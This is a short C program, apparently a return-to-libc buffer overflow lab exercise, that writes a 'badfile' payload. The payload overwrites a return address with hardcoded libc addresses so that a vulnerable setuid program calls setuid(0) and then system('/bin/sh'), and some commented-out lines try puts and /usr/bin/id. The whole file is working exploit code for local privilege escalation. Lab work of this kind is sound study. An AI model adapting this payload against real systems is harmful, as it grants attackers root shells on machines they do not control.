/* exploit.c */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define TARGET_BUF_LEN  (0x14)

int main(int argc, char **argv)
{
    /* TODO */
    char buf[64];
    FILE *badfile;
    badfile = fopen("./badfile", "w");
    memset(buf, 0x90, 64);

    /* decide the addresses and the values for buf. */

    //*(long *)&buf[TARGET_BUF_LEN+20] = 0xb7e5f430;   // system()
    *(long *)&buf[TARGET_BUF_LEN+8] = 0xb7e5f430;    // system()
    //*(long *)&buf[TARGET_BUF_LEN+8] = 0xb7e87740;  // puts
    *(long *)&buf[TARGET_BUF_LEN+16] = 0xbffffd6d;   // /bin/sh
    //*(long *)&buf[TARGET_BUF_LEN+12] = 0xbffffe4b;   // /usr/bin/id
    *(long *)&buf[TARGET_BUF_LEN+12] = 0;   // setuid(0)
    //*(long *)&buf[TARGET_BUF_LEN+20] = 0xb7e87740;  // puts
    *(long *)&buf[TARGET_BUF_LEN+4] = 0xb7ed8e40;    // setuid
    //*(long *)&buf[TARGET_BUF_LEN+28] = 0xbffffd6d;   // /bin/sh
    printf("sizeof buffer = %lu\n", sizeof(buf));

    fwrite(buf, sizeof(buf), 1, badfile);
    fclose(badfile);

    return 0;
}

